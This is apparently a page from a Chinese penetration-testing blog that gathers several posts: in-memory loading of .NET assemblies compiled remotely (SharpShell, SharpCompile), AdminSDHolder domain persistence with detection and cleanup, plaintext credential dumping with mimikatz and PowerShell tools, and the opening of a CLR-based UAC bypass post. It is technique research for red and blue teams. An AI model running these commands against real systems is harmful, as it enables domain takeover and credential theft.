	}
	public class aaa
	{
    		public static void bbb()
    		{
        		System.Diagnostics.Process p = new System.Diagnostics.Process();
        		p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
        		p.Start();
    		}
	}
}
</code></pre></div></div>

<p>使用SharpCradle对其进行远程下载执行时，默认只会执行Main函数中的内容</p>

<h2 id="0x04-sharpshell的利用分析">0x04 SharpShell的利用分析</h2>
<hr>

<p>https://github.com/cobbr/SharpShell</p>

<p>SharpShell能够利用Rosyln C＃编译器快速交叉编译.NET Framework控制台应用程序或库</p>

<p><strong>注：</strong></p>

<p>这里只需要代码文件，不需要编译后的二进制文件</p>

<p>SharpShell包括以下三个子工程：</p>

<ol>
  <li>SharpShell</li>
</ol>

<p>使用Rosyln C＃编译器对输入的代码进行编译，通过内存加载后返回执行的结果</p>

<p>由于Roslyn只能在.NET Core或.NET 4.6+使用，不支持.NET 3.5和.NET 4.0</p>

<p>所以这里的SharpShell需要.NET 4.6+的环境才能运行</p>

<p><strong>注：</strong></p>

<p>在我的测试环境中,.NET 4.5也可以运行，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-22/2-1.png" alt="Alt text"></p>

<ol>
  <li>SharpShell.API</li>
</ol>

<p>SharpShell.API需要.NET Core的开发环境，这里可以参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/SharpGen%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">《SharpGen利用分析》</a>中SharpGen的开发环境配置</p>

<p>SharpShell.API使用ASP.NET Core 2.1调用Roslyn，作为http server，接收从SharpShell.API.SharpShell传来的代码，进行编译后回传生成的二进制文件</p>

<ol>
  <li>SharpShell.API.SharpShell</li>
</ol>

<p>SharpShell.API.SharpShell可在.NET 3.5和.NET 4.0使用，将代码文件以POST形式发送到http server，接收编译后的二进制文件，通过内存加载后返回执行的结果</p>

<p>这里只介绍同Assembly.Load()相关的工程SharpShell.API和SharpShell.API.SharpShell</p>

<h3 id="1测试环境搭建">1.测试环境搭建</h3>

<h4 id="1sharpshellapi">(1)SharpShell.API</h4>

<p>需要.NET Core的开发环境</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/cobbr/SharpShell
cd .\SharpShell\SharpShell.API
dotnet build --configuration Release
cd .\bin\Release\netcoreapp2.1
dotnet SharpShell.API.dll
</code></pre></div></div>

<p>启动SharpShell.API后，访问：http://127.0.0.1:5000/swagger/index.html</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-22/2-2.png" alt="Alt text"></p>

<h4 id="2sharpshellapisharpshell">(2)SharpShell.API.SharpShell</h4>

<p>需要Visual Studio的开发环境，编译后生成文件SharpShell.API.SharpShell.exe</p>

<p>启动后输入测试命令<code class="language-plaintext highlighter-rouge">Shell.ShellExecute("whoami");</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-22/2-3.png" alt="Alt text"></p>

<h3 id="2实现流程">2.实现流程</h3>

<p>这里我使用wireshark抓取整个过程的通信数据，较为直观，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-22/2-4.png" alt="Alt text"></p>

<p>流程如下：</p>

<ol>
  <li>SharpShell.API.SharpShell发送POST请求</li>
  <li>SharpShell.API接收POST请求后，回复确认消息<code class="language-plaintext highlighter-rouge">HTTP/1.1 100 Continue</code></li>
  <li>SharpShell.API.SharpShell发送JSON格式的代码文件</li>
  <li>SharpShell.API接收代码文件，使用Rosyln C＃编译器对代码文件进行编译，将生成的内容以base64的形式回复</li>
  <li>SharpShell.API.SharpShell将接收到的回复内容作base64解密，调用Assembly.Load()进行加载</li>
</ol>

<p>综上，SharpShell.API.SharpShell也是调用了Assembly.Load()从内存中加载.NET程序集，同SharpCradle的区别如下：</p>

<p>SharpCradle需要在远程服务器上保存编译后的二进制文件</p>

<p>SharpShell只需要向远程服务器发送代码文件，不需要编译后的二进制文件</p>

<h2 id="0x05-sharpcompile的利用分析">0x05 SharpCompile的利用分析</h2>
<hr>

<p>https://github.com/SpiderLabs/SharpCompile</p>

<p>SharpCompile包括以下两部分：</p>

<ol>
  <li>SharpCompileServer</li>
</ol>

<p>作为http server，用来接收POST请求传来的代码，进行编译后回传生成的二进制文件</p>

<p>这里使用csc.exe编译代码，而不是SharpShell中的Rosyln C＃编译器</p>

<p>默认csc.exe版本：<code class="language-plaintext highlighter-rouge">C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe</code></p>

<p><strong>注：</strong></p>

<p>这里需要注意http server和本地.NET的版本是否一致</p>

<ol>
  <li>SharpCompile.cna</li>
</ol>

<p>Cobalt Strike的脚本文件，在使用前需要先指定http server的url和脚本文件保存的位置</p>

<p>默认使用curl将代码文件上传到http server，所以测试环境需要提前安装curl</p>

<h3 id="1实际测试">1.实际测试</h3>

<h4 id="1开启http-server">(1)开启http server</h4>

<p>SharpCompileServer需要Visual Studio的开发环境，编译后生成文件SharpCompileServer.exe</p>

<p>执行SharpCompileServer.exe，开启http server，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-22/2-5.png" alt="Alt text"></p>

<h4 id="2http-server的功能测试">(2)http server的功能测试</h4>

<p>向http server发送POST格式的代码，查看返回的内容</p>

<p>test.cs保存代码文件，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
namespace TestCalc
{
    class Hello
    {
        static void Main(string[] args)
        {
            System.Diagnostics.Process.Start("calc.exe");
        }
    }
}
</code></pre></div></div>

<p>这里分别使用powershell和curl命令进行测试</p>

<ol>
  <li>powershell</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-RestMethod -Uri http://192.168.112.175 -Method Post -InFile .\test.cs -OutFile .\out.exe
</code></pre></div></div>

<p>以上命令会读取test.cs中的内容，发送至http server(http://192.168.112.175)，将返回的文件保存为out.exe</p>

<p><strong>注：</strong></p>

<p>Invoke-RestMethod命令需要Powershell v3.0</p>

<ol>
  <li>curl</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl --request POST --data-binary @test.cs -o out.exe http://192.168.112.175 -v
</code></pre></div></div>

<p>以上命令会读取test.cs中的内容，发送至http server(http://192.168.112.175)，将返回的文件保存为out.exe</p>

<p>这里使用wireshark抓取整个过程的通信数据，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-22/2-6.png" alt="Alt text"></p>

<h4 id="3sharpcompilecna测试">(3)SharpCompile.cna测试</h4>

<p>在我的测试环境下，SharpCompile.cna中的<code class="language-plaintext highlighter-rouge">exec(@command);</code>命令无法执行，所以无法复现SharpCompile.cna的功能</p>

<h3 id="2实现流程-1">2.实现流程</h3>

<p>但是SharpCompile.cna的代码逻辑比较直观，实现流程如下：</p>

<ol>
  <li>调用curl命令将代码文件以post的形式发送至http server，接收内容并保存在本地</li>
  <li>执行文件</li>
  <li>删除文件</li>
</ol>

<p>SharpCompile没有使用Assembly.Load()从内存中加载.NET程序集，而是保存在硬盘执行后删除</p>

<p>这里可以对其进一步修改，使用Assembly.Load()从内存中加载.NET程序集</p>

<h2 id="0x06-三个开源工程的比较和利用思路">0x06 三个开源工程的比较和利用思路</h2>
<hr>

<p>SharpCradle需要在远程服务器上保存提前编译好的二进制文件，下载后使用Assembly.Load()从内存中加载.NET程序集</p>

<p>SharpShell.API.SharpShell向远程服务器发送代码文件，服务器使用Rosyln C＃编译器生成二进制文件，下载后使用Assembly.Load()从内存中加载.NET程序集</p>

<p>SharpCompile向远程服务器发送代码文件，服务器使用csc.exe生成二进制文件，下载到本地后直接执行</p>

<p>功能最为完整的是SharpShell.API.SharpShell，优点如下：</p>

<ul>
  <li>整个过程在内存执行，不写入文件系统</li>
  <li>可生成指定.NET版本的二进制文件</li>
  <li>仅需要c#格式的payload，当然也可以使用编译好的二进制文件(只能是.NET程序集)</li>
</ul>

<p>在利用思路上，<code class="language-plaintext highlighter-rouge">Assembly.Load</code>同<code class="language-plaintext highlighter-rouge">execute-assembly</code>类似，区别在于payload的格式不同</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了Assembly.Load的实现方法，结合三个开源工程SharpCradle、SharpShell和SharpCompile，分析细节，总结利用思路。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 22, 2019
  </div>

  
</article><article class="post">
  <h1>域渗透——AdminSDHolder</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>AdminSDHolder是一个特殊的AD容器，具有一些默认安全权限，用作受保护的AD账户和组的模板</p>

<p>Active Directory将采用AdminSDHolder对象的ACL并定期将其应用于所有受保护的AD账户和组，以防止意外和无意的修改并确保对这些对象的访问是安全的</p>

<p>如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法</p>

<p>本将要参考公开资料，结合自己的理解，介绍利用方法，补全清除ACL的方法，分析检测方法</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>利用思路</li>
  <li>如何枚举受保护的AD账户和组中的信息</li>
  <li>如何查询AdminSDHolder对象的ACL</li>
  <li>如何向AdminSDHolder对象添加ACL</li>
  <li>删除AdminSDHolder中指定用户的ACL</li>
  <li>完整利用方法</li>
  <li>检测建议</li>
</ul>

<h2 id="0x02-利用思路">0x02 利用思路</h2>
<hr>

<h3 id="1枚举受保护的ad账户和组中的信息">1.枚举受保护的AD账户和组中的信息</h3>

<p>通常为域内高权限用户，在我的Server2008R2下包含以下组：</p>

<ul>
  <li>Administrators</li>
  <li>Print Operators</li>
  <li>Backup Operators</li>
  <li>Replicator</li>
  <li>Domain Controllers</li>
  <li>Schema Admins</li>
  <li>Enterprise Admins</li>
  <li>Domain Admins</li>
  <li>Server Operators</li>
  <li>Account Operators</li>
  <li>Read-only Domain Controllers</li>
  <li>Organization Management</li>
  <li>Exchange Trusted Subsystem</li>
</ul>

<h3 id="2向adminsdholder对象添加acl">2.向AdminSDHolder对象添加ACL</h3>

<p>例如，添加用户testa对AdminSDHolder的完全管理权限，默认60分钟以后会自动推送权限配置信息，testa随即获得对所有受保护帐户和组的完全管理权限</p>

<h3 id="3获得对整个域的控制权限">3.获得对整个域的控制权限</h3>

<p>此时用户testa能够向域管理员组添加帐户，也能够直接访问域控制器上的文件</p>

<h2 id="0x03-枚举受保护的ad账户和组中的信息">0x03 枚举受保护的AD账户和组中的信息</h2>
<hr>

<p>关于AdminSDHolder，可以参考的资料：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)#id0250006</p>

<p>受保护的AD账户和组的特征如下：</p>

<p><strong>AdminCount属性为1</strong></p>

<p>但是，如果对象已移出受保护组，其AdminCount属性仍为1，也就是说，有可能获得曾经是受保护组的帐户和组</p>

<h3 id="1枚举受保护ad账户的方法">1.枚举受保护AD账户的方法</h3>

<h4 id="1powerview">(1)PowerView</h4>

<p>下载地址：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser -AdminCount
</code></pre></div></div>

<p>只筛选出用户名的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser -AdminCount |select samaccountname
</code></pre></div></div>

<h4 id="2adfind">(2)Adfind</h4>

<p>下载地址：</p>

<p>http://www.joeware.net/freetools/tools/adfind/index.htm</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Adfind.exe -f "&amp;(objectcategory=person)(samaccountname=*)(admincount=1)" -dn
</code></pre></div></div>

<h4 id="3activedirectory模块">(3)ActiveDirectory模块</h4>

<p>Powershell模块，需要安装，域控制器一般会安装</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ActiveDirectory
Get-ADObject -LDAPFilter “(&amp;(admincount=1)(|(objectcategory=person)(objectcategory=group)))” |select name
</code></pre></div></div>

<p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
</code></pre></div></div>

<p>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p>

<p>https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</p>

<p><strong>注：</strong></p>

<p>该命令会列出受保护的AD账户和组</p>

<h3 id="2枚举受保护ad组的方法">2.枚举受保护AD组的方法</h3>

<h4 id="1powerview-1">(1)PowerView</h4>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetGroup -AdminCount
</code></pre></div></div>

<h4 id="2adfind-1">(2)Adfind</h4>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Adfind.exe -f "&amp;(objectcategory=group)(admincount=1)" -dn
</code></pre></div></div>

<h4 id="3activedirectory模块-1">(3)ActiveDirectory模块</h4>

<p>Powershell模块，需要安装，域控制器一般会安装</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ActiveDirectory
Get-ADObject -LDAPFilter “(&amp;(admincount=1)(|(objectcategory=person)(objectcategory=group)))” |select name
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>该命令会列出受保护的AD账户和组</p>

<h2 id="0x04-操作adminsdholder对象的acl">0x04 操作AdminSDHolder对象的ACL</h2>
<hr>

<h3 id="1查询adminsdholder对象的acl">1.查询AdminSDHolder对象的ACL</h3>

<p>使用PowerView，地址如下：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>

<p><strong>注：</strong></p>

<p>该版本不支持<code class="language-plaintext highlighter-rouge">Remove-DomainObjectAcl</code>命令</p>

<p>查询AdminSDHolder对象的ACL等价于查询”CN=AdminSDHolder,CN=System,DC=test,DC=com”的ACL</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
Get-ObjectAcl -ADSprefix "CN=AdminSDHolder,CN=System" |select IdentityReference
</code></pre></div></div>

<h3 id="2向adminsdholder对象添加acl-1">2.向AdminSDHolder对象添加ACL</h3>

<p>使用PowerView，地址如下：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>

<p>添加用户testa的完全访问权限，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName testa -Verbose -Rights All
</code></pre></div></div>

<p>默认等待60分钟以后，testa获得对所有受保护的AD账户和组的完全访问权限</p>

<h3 id="3删除adminsdholder中指定用户的acl">3.删除AdminSDHolder中指定用户的ACL</h3>

<p>使用PowerView，地址如下：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>

<p><strong>注：</strong></p>

<p>该版本支持<code class="language-plaintext highlighter-rouge">Remove-DomainObjectAcl</code>命令，但不支持参数TargetADSprefix，所以这里使用TargetSearchBase参数代替</p>

<p>搜索条件为<code class="language-plaintext highlighter-rouge">"LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com"</code></p>

<p>删除用户testa的完全访问权限，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com" -PrincipalIdentity testa -Rights All -Verbose
</code></pre></div></div>

<h2 id="0x05-完整利用思路">0x05 完整利用思路</h2>
<hr>

<h3 id="1枚举受保护的ad账户和组中的信息-1">1.枚举受保护的AD账户和组中的信息</h3>

<p>查找有价值的用户，需要确认该用户是否属于受保护的AD账户和组，排除曾经属于受保护的AD账户和组</p>

<h3 id="2向adminsdholder对象添加acl-2">2.向AdminSDHolder对象添加ACL</h3>

<p>例如添加用户testa对AdminSDHolder的完全访问权限</p>

<p>默认等待60分钟以后，testa获得对所有受保护的AD账户和组的完全访问权限</p>

<p>可以通过修改注册表的方式设置权限推送的间隔时间，注册表位置如下：</p>

<ul>
  <li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters,AdminSDProtectFrequency,REG_DWORD</li>
</ul>

<p>例如修改成等待600秒的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency /t REG_DWORD /d 600
</code></pre></div></div>

<p>参考资料：</p>

<p>https://blogs.technet.microsoft.com/askds/2009/05/07/five-common-questions-about-adminsdholder-and-sdprop/</p>

<p><strong>注：</strong></p>

<p>不建议降低默认间隔时间，因为在大型环境中可能会导致LSASS性能下降</p>

<h3 id="3获得对整个域的控制权限-1">3.获得对整个域的控制权限</h3>

<h4 id="1用户testa能够向域管理员组添加帐户">(1)用户testa能够向域管理员组添加帐户</h4>

<p>验证权限的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'testa'}
</code></pre></div></div>

<h4 id="2用户testa能够直接访问域控制器上的文件">(2)用户testa能够直接访问域控制器上的文件</h4>

<h2 id="0x06-检测和清除">0x06 检测和清除</h2>
<hr>

<h3 id="1检测adminsdholder的acl">1.检测AdminSDHolder的ACL</h3>

<p>查看<code class="language-plaintext highlighter-rouge">"CN=AdminSDHolder,CN=System,DC=test,DC=com"</code>的ACL，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
Get-ObjectAcl -ADSprefix "CN=AdminSDHolder,CN=System" |select IdentityReference
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>这里使用的PowerView版本：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>

<p>查看是否有可疑用户</p>

<h3 id="2清除adminsdholder中可疑用户的acl">2.清除AdminSDHolder中可疑用户的ACL</h3>

<p>删除AdminSDHolder中可疑用户testa的ACL</p>

<p>使用PowerView，地址如下：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>

<p>删除用户testa的完全访问权限，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com" -PrincipalIdentity testa -Rights All -Verbose
</code></pre></div></div>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了AdminSDHolder作为权限维持的利用方法，补充了检测和清除AdminSDHolder中可疑用户ACL的方法</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 24, 2019
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows中Credential Manager的信息获取</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在后渗透阶段，获得权限后需要搜集目标系统的信息。信息越全面，越有助于进一步的渗透。
对于Windows系统，Credential Manager中包含十分重要的信息。
这其中具体包含什么类型的信息，获取的方法有哪些呢？本文将要一一介绍</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Credential Manager中不同类型的凭据</li>
  <li>不同凭据的明文口令获取方法</li>
  <li>实际测试</li>
</ul>

<h2 id="0x02-credential-manager简介">0x02 Credential Manager简介</h2>
<hr>

<p>Credential Manager，中文翻译为凭据管理器，用来存储凭据(例如网站登录和主机远程连接的用户名密码)</p>

<p>如果用户选择存储凭据，那么当用户再次使用对应的操作，系统会自动填入凭据，实现自动登录</p>

<p>凭据保存在特定的位置，被称作为保管库(vault)(位于<code class="language-plaintext highlighter-rouge">%localappdata%/Microsoft\Vault</code>)</p>

<h3 id="凭据类别">凭据类别：</h3>

<p>包含两种，分别为<code class="language-plaintext highlighter-rouge">Domain Credentials</code>和<code class="language-plaintext highlighter-rouge">Generic Credentials</code></p>

<h4 id="domain-credentials">Domain Credentials：</h4>

<p>只有本地Local Security Authority (LSA)能够对其读写</p>

<p>也就是说，普通权限无法读取Domain Credentials类型的明文口令</p>

<h4 id="generic-credentials">Generic Credentials：</h4>

<p>能够被用户进程读写</p>

<p>也就是说，普通权限可以读取Generic Credentials类型的明文口令</p>

<p>参考资料：</p>

<p>https://msdn.microsoft.com/en-us/library/aa380517.aspx</p>

<h2 id="0x03-实际测试">0x03 实际测试</h2>
<hr>

<h3 id="测试1">测试1：</h3>

<p>测试系统： Win7</p>

<p>访问文件共享<code class="language-plaintext highlighter-rouge">\\192.168.62.130</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-21/2-1.png" alt="Alt text"></p>

<p>填入正确的用户名密码，选中<code class="language-plaintext highlighter-rouge">记住我的凭据</code></p>

<p>下次再访问时，就不需要再次输入用户名密码</p>

<p>通过控制面板能够找到添加的凭据，位置为<code class="language-plaintext highlighter-rouge">控制面板</code>-<code class="language-plaintext highlighter-rouge">用户帐户和家庭安全</code>-<code class="language-plaintext highlighter-rouge">凭据管理器</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-21/2-2.png" alt="Alt text"></p>

<p>密码被加密，无法直接查看</p>

<p><strong>注：</strong></p>

<p>文件共享的凭据类型默认为Domain Credentials</p>

<h3 id="测试2">测试2：</h3>

<p>测试系统： Win8</p>

<p>使用IE浏览器访问网站 https://github.com/，登录成功后选择记录用户名密码</p>

<p>通过控制面板访问凭据管理器，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-21/2-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>Win8开始，凭据管理器的页面进行了改版(同Win7不同)，添加了Web凭据</p>

<p>显示凭据密码需要填入当前用户名口令，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-21/2-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>IE浏览器的凭据类型默认为Generic Credentials</p>

<h3 id="测试3">测试3：</h3>

<p>测试系统： Win7</p>

<p>通过控制面板添加普通凭据，Internet地址或网络地址为<code class="language-plaintext highlighter-rouge">Generi1</code>，用户名为<code class="language-plaintext highlighter-rouge">test1</code>，密码为<code class="language-plaintext highlighter-rouge">pass1</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-21/2-5.png" alt="Alt text"></p>

<p>通过控制面板无法获得该普通凭据的明文口令</p>

<h2 id="0x04-导出credentials中的明文口令">0x04 导出Credentials中的明文口令</h2>
<hr>

<h3 id="1获得系统凭据的基本信息">1、获得系统凭据的基本信息</h3>

<h4 id="工具1-vaultcmdwindows系统自带">工具1： vaultcmd(windows系统自带)</h4>

<p>常用命令：</p>

<p>列出保管库(vault)列表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vaultcmd /list
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>不同类型的凭据保存在不同的保管库(vault)下</p>

<p>列出保管库(vault)概要，凭据名称和GUID：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vaultcmd /listschema
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>GUID对应路径<code class="language-plaintext highlighter-rouge">%localappdata%/Microsoft\Vault\{GUID}</code>下的文件，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-21/2-6.png" alt="Alt text"></p>

<p>列出名为”Web Credentials”的保管库(vault)下的所有凭据信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vaultcmd /listcreds:"Web Credentials" 
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>如果是中文操作系统，可将名称替换为对应的GUID，命令如下</p>

<p>列出GUID为<code class="language-plaintext highlighter-rouge">{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}</code>的保管库(vault)下的所有凭据：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vaultcmd /listcreds:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}
</code></pre></div></div>

<p>列出GUID为<code class="language-plaintext highlighter-rouge">{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}</code>的保管库(vault)的属性，包括文件位置、包含的凭据数量、保护方法：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vaultcmd /listproperties:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}
</code></pre></div></div>

<h4 id="工具2cmdkey">工具2：cmdkey</h4>

<p>命令行输入<code class="language-plaintext highlighter-rouge">cmdkey /list</code>能够列举出系统中的Windows凭据</p>

<h3 id="2获得domain-credentials的明文口令">2、获得Domain Credentials的明文口令</h3>

<p>工具： mimikatz</p>

<p>参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sekurlsa::logonpasswords
</code></pre></div></div>

<p>对应前面的<strong>测试1</strong>，在credman位置显示，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-21/3-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>mimikatz不仅能导出Domain Credentials的明文口令，也能导出普通凭据(Generic Credentials)类型的明文口令，但无法导出IE浏览器保存的Generic Credentials类型的明文口令</p>

<h3 id="3获得generic-credentials的明文口令">3、获得Generic Credentials的明文口令</h3>

<h4 id="1-ie浏览器保存的generic-credentials">(1) IE浏览器保存的Generic Credentials</h4>

<p>工具： Get-VaultCredential.ps1</p>

<p>下载地址：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-VaultCredential.ps1</p>

<p>对应前面的<strong>测试2</strong>，Win8系统成功导出明文口令，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-21/3-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>该脚本也能获得名为Windows Credential的保管库(vault)下面的凭据信息，但无法获得凭据的明文口令</p>

<p><strong>补充：</strong></p>

<p>Win7系统下的凭据管理器同Win8有区别，多了一个选项，指定<code class="language-plaintext highlighter-rouge">程序使用此密码时提示我提供权限</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-21/3-3.png" alt="Alt text"></p>

<p>当选中时，使用powershell脚本读取明文口令时会弹框提示(无法绕过)，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-21/3-4.png" alt="Alt text"></p>

<h4 id="2-其他类型的普通票据">(2) 其他类型的普通票据</h4>

<p>工具： Invoke-WCMDump.ps1</p>

<p>下载地址：</p>

<p>https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1</p>

<p>对应<strong>测试3</strong>，普通用户权限即可，能够导出普通票据的明文口令，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-21/3-5.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>该脚本还能导出Domain Credentials的信息(不包括明文口令)</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了不同类型的票据(Credential)明文口令的获取方法，测试多个工具，帮助大家更好理解这部分内容</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 21, 2017
  </div>

  
</article><article class="post">
  <h1>Use CLR to bypass UAC</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/">《Use CLR to maintain persistence》</a>介绍了通过CLR劫持.Net程序的后门，特点是无需管理员权限，并能够劫持所有.Net程序。那么，如果劫持了高权限的.Net程序，就能够绕过UAC，比如gpedit.msc</p>

<p>最近我在clem@clavoillotte的博客上也看到了相同的利用思路，并且，他的博客里有更多值得学习的地方。于是，我对他博客介绍的内容进行了整理，结合自己的经验，适当作补充，分享给大家。</p>

<p>clem@clavoillotte的博客地址：</p>

<p>https://offsec.provadys.com/UAC-bypass-dotnet.html</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>使用CLR绕过UAC的方法</li>
  <li>劫持系统CLSID绕过UAC的方法</li>
</ul>

<h2 id="0x02-使用clr绕过uac">0x02 使用CLR绕过UAC</h2>
<hr>

<p>我在<a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/">《Use CLR to maintain persistence》</a>一文中使用了wmic修改环境变量，代码如下：</p>

